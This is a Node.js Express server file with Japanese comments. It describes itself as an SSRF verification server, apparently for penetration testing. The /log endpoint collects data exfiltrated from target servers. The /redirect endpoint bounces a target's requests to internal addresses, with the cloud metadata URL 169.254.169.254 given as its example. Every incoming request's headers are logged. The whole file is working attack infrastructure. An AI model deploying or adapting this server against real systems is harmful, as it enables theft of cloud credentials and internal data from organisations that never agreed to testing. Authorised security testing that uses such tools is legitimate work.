const express = require('express');
const morgan = require('morgan');
const app = express();
const PORT = 3001;

// --- 1. ボディ解析ミドルウェアの追加 ---
// SSRFの結果としてPOSTされたデータ（JSONやテキスト）を読み取れるようにします
app.use(express.json());
app.use(express.text({ type: '*/*' })); // すべてのテキスト形式を受け入れる
app.use(express.urlencoded({ extended: true }));

// --- 2. ロギング設定 ---
// 誰が（IP）、どのメソッドで、どこにアクセスしたかを詳細に出力
app.use(morgan(':remote-addr - :method :url :status :res[content-length] - :response-time ms'));

// カスタムミドルウェア：すべてのリクエストヘッダーをコンソールに表示
app.use((req, res, next) => {
    console.log('\n' + '='.repeat(50));
    console.log(`[${new Date().toISOString()}] Incoming Request from: ${req.ip}`);
    console.log('--- Headers ---');
    console.table(req.headers);
    next();
});

// --- 3. エンドポイント設定 ---

// A. 基本のトップページ
app.get('/', (req, res) => {
    res.send('SSRF Verification Server (Upgraded Version)');
});

// B. データ窃取（Exfiltration）受信用エンドポイント
// ターゲットからファイルの中身などを送りつけられた際に、中身をコンソールに表示します
// 例: http://your-domain/log?data=...
app.all('/log', (req, res) => {
    console.log('--- [!] Data Received ---');
    console.log('Query Params:', req.query);
    
    if (req.body && Object.keys(req.body).length > 0) {
        console.log('Body Content:', req.body);
    } else {
        console.log('Body Content: (Empty)');
    }
    
    res.status(200).send('Logged\n');
});

// C. リダイレクト検証用 (302)
// ターゲットサーバーを「自分自身（127.0.0.1）」や「内部ネットワーク」へ誘導します
// 例: /redirect?url=http://169.254.169.254/latest/meta-data/
app.get('/redirect', (req, res) => {
    const targetUrl = req.query.url;
    if (!targetUrl) {
        return res.status(400).send('Missing "url" parameter. Use /redirect?url=http://...');
    }
    console.log(`[Redirecting] Target: ${targetUrl}`);
    res.redirect(302, targetUrl);
});

// D. 内部情報のダミーエンドポイント
// SSRFが成功して「このサーバーの内部」まで到達できたかの確認用
app.get('/internal/secret', (req, res) => {
    res.json({
        status: "success",
        message: "You have reached the internal secret endpoint!",
        detected_ip: req.ip,
        headers: req.headers
    });
});

// --- 4. サーバー起動 ---
app.listen(PORT, '0.0.0.0', () => {
    console.log('\n' + '*'.repeat(50));
    console.log(`SSRF Test Server is running!`);
    console.log(`- Local:   http://localhost:${PORT}`);
    console.log(`- Network: http://0.0.0.0:${PORT}`);
    console.log('*'.repeat(50) + '\n');
});